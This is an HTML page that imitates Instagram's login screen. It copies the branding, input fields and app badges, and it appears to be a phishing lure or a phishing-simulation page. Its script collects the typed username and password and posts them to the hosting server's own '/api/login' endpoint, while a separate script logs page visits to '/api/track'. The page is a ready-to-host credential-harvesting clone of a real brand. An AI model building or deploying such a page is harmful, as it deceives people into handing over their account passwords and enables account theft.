<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
      <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
      </div>
      <div class="l-user">
        <div class="c-panel group">
          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
          <form class="c-panel__form" id="loginForm">
            <input type="text" class="c-panel__input" id="username" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" class="c-panel__input" id="password" name="password" placeholder="Password" required>
            <button type="submit" class="c-btn">Log In</button>
            <span class="c-panel__span">OR</span>
          </form>
          <a href="#" class="c-panel__facebook">Login with Facebook</a>
          <a href="#" class="c-panel__forgot">Forgot password?</a>
          <p id="message" style="margin: 10px 0; font-size: 13px; text-align: center;"></p>
        </div>
        <div class="c-signup group">
          <p>Don't have an account? <span>Sign up</span></p>
        </div>
        <div class="c-app">
          <p>Get the app.</p>
          <div class="c-app__download">
            <img src="assets/img/apple.png" alt="Apple Store">
            <img src="assets/img/google.png" alt="Google Play">
          </div>
        </div>
      </div>
  </main>

  <script>
    // Track page visit
    fetch("/api/track", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ page: "login" }),
    }).catch(() => {});
  </script>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const msg = document.getElementById("message");

      try {
        const res = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password }),
        });

        const data = await res.json();

        if (data.success) {
          window.location.href = "/secure";
        } else {
          msg.style.color = "red";
          msg.textContent = data.message;
        }
      } catch (err) {
        msg.style.color = "red";
        msg.textContent = "Something went wrong. Try again.";
      }
    });
  </script>
</body>
</html>
